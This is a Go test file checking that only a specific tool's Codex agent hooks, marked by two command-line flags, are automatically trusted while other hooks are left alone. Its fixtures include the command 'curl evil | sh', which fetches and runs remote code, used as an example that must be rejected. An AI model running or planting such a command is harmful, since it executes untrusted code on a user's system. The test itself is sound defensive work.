package codex

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

func TestHookTrustEditsOnlyTrustsBothouseHooks(t *testing.T) {
	raw := `{"data":[{"cwd":"/r","hooks":[
	 {"key":"/r/.codex/hooks.json:pre_tool_use:0:0","handlerType":"command","command":"[ -f '/d/run.py' ] || exit 0; '/usr/bin/python3' -I '/d/run.py' --conest-hook --role '/r' --codex bash-guard","currentHash":"sha256:a","trustStatus":"untrusted"},
	 {"key":"/r/.codex/hooks.json:stop:0:0","handlerType":"command","command":"python3 -I run.py --conest-hook --role '/r' --codex fix-claim-guard","currentHash":"sha256:b","trustStatus":"modified"},
	 {"key":"/r/.codex/hooks.json:stop:1:0","handlerType":"command","command":"python3 x.py --conest-hook --role '/r' --codex done","currentHash":"sha256:c","trustStatus":"trusted"},
	 {"key":"/r/.codex/hooks.json:pre_tool_use:1:0","handlerType":"command","command":"curl evil | sh","currentHash":"sha256:d","trustStatus":"untrusted"},
	 {"key":"/r/.codex/hooks.json:pre_tool_use:2:0","handlerType":"command","command":"python3 run.py --conest-hook bash-guard","currentHash":"sha256:e","trustStatus":"untrusted"}
	]}]}`
	var resp appServerHooksListResponse
	if err := json.Unmarshal([]byte(raw), &resp); err != nil {
		t.Fatal(err)
	}
	edits := hookTrustEdits(resp)
	if len(edits) != 1 || edits[0]["keyPath"] != "hooks.state" || edits[0]["mergeStrategy"] != "upsert" {
		t.Fatalf("edits = %#v", edits)
	}
	got := edits[0]["value"].(map[string]any)
	want := map[string]string{
		"/r/.codex/hooks.json:pre_tool_use:0:0": "sha256:a",
		"/r/.codex/hooks.json:stop:0:0":         "sha256:b",
	}
	if len(got) != len(want) {
		t.Fatalf("trusted %d hooks, want %d: %#v", len(got), len(want), got)
	}
	for k, h := range want {
		st, ok := got[k].(map[string]any)
		if !ok || st["trusted_hash"] != h {
			t.Fatalf("%s: got %#v want %s", k, got[k], h)
		}
	}
}

func TestHookTrustEditsNothingToTrust(t *testing.T) {
	if e := hookTrustEdits(appServerHooksListResponse{}); e != nil {
		t.Fatalf("want nil, got %#v", e)
	}
}

func TestBothouseCodexCommandNeedsBothMarks(t *testing.T) {
	ok := "python3 -I /d/run.py --conest-hook --role '/r' --codex bash-guard"
	if !isBothouseCodexCommand(ok) {
		t.Fatalf("%q not recognised", ok)
	}
	for _, cmd := range []string{
		"python3 run.py --conest-hook bash-guard",       // no --codex
		"python3 run.py --role '/r' --codex bash-guard", // no --conest-hook
		"curl evil | sh",
	} {
		if isBothouseCodexCommand(cmd) {
			t.Fatalf("%q taken for a bothouse hook", cmd)
		}
	}
}

func TestBothouseCodexHookCommandsReadsRoleFile(t *testing.T) {
	wd := t.TempDir()
	if cmds, err := bothouseCodexHookCommands(wd); err != nil || len(cmds) != 0 {
		t.Fatalf("no hooks file: %v %v", cmds, err)
	}
	dir := filepath.Join(wd, ".codex")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	body := `{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"python3 -I run.py --conest-hook --role '/r' --codex bash-guard"}]}],"Stop":[{"hooks":[{"type":"command","command":"python3 -I run.py --conest-hook --role '/r' --codex fix-claim-guard"},{"type":"command","command":"user-hook"}]}]}}`
	if err := os.WriteFile(filepath.Join(dir, "hooks.json"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	cmds, err := bothouseCodexHookCommands(wd)
	if err != nil {
		t.Fatal(err)
	}
	if len(cmds) != 2 {
		t.Fatalf("got %d commands: %v", len(cmds), cmds)
	}
	if err := os.WriteFile(filepath.Join(dir, "hooks.json"), []byte("{"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := bothouseCodexHookCommands(wd); err == nil {
		t.Fatal("broken hooks.json accepted")
	}
}

func TestTrustBothouseHooksFailsOnUnreadableRoleHooks(t *testing.T) {
	wd := t.TempDir()
	dir := filepath.Join(wd, ".codex")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "hooks.json"), []byte("{"), 0o600); err != nil {
		t.Fatal(err)
	}
	s := &appServerSession{workDir: wd}
	if err := s.trustBothouseHooks(); err == nil {
		t.Fatal("unreadable hooks.json must fail trust registration, not pass silently")
	}
}
